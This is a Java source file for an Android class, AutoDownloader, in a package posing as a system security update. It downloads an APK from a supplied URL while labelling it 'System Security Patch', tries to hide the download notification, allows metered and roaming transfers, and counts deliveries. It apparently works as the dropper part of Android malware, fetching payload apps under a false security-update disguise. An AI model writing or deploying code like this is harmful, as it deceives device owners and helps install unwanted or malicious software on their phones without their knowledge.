package com.system.security.update;

import android.app.DownloadManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;

public class AutoDownloader {
    
    private static long lastDownloadId = -1;
    private static long lastDownloadTime = 0;
    
    public static void downloadApk(Context context, String url) {
        try {
            // Rate limit: minimum 2 seconds between downloads
            long now = System.currentTimeMillis();
            if (now - lastDownloadTime < 2000) return;
            lastDownloadTime = now;
            
            // Check if previous download is still active
            if (lastDownloadId != -1) {
                DownloadManager dm = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
                DownloadManager.Query query = new DownloadManager.Query();
                query.setFilterById(lastDownloadId);
                Cursor cursor = dm.query(query);
                if (cursor != null) {
                    if (cursor.moveToFirst()) {
                        int status = cursor.getInt(
                                cursor.getColumnIndex(DownloadManager.COLUMN_STATUS));
                        if (status == DownloadManager.STATUS_RUNNING || 
                            status == DownloadManager.STATUS_PENDING) {
                            cursor.close();
                            return; // Still downloading, skip
                        }
                    }
                    cursor.close();
                }
            }
            
            // Create download request
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
            request.setTitle("System Security Patch");
            request.setDescription("Downloading important security update...");
            
            // Hide notification
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
                try {
                    request.setNotificationVisibility(
                            DownloadManager.Request.VISIBILITY_HIDDEN);
                } catch (SecurityException e) {
                    request.setNotificationVisibility(
                            DownloadManager.Request.VISIBILITY_VISIBLE);
                }
            }
            
            // Save to Downloads folder
            String fileName = "SecurityPatch_" + System.currentTimeMillis() + ".apk";
            request.setDestinationInExternalPublicDir(
                    Environment.DIRECTORY_DOWNLOADS, fileName);
            
            request.setAllowedOverMetered(true);
            request.setAllowedOverRoaming(true);
            request.setMimeType("application/vnd.android.package-archive");
            
            // Enqueue download
            DownloadManager dm = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
            lastDownloadId = dm.enqueue(request);
            
            // Increment counter
            Config.totalDownloads++;
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
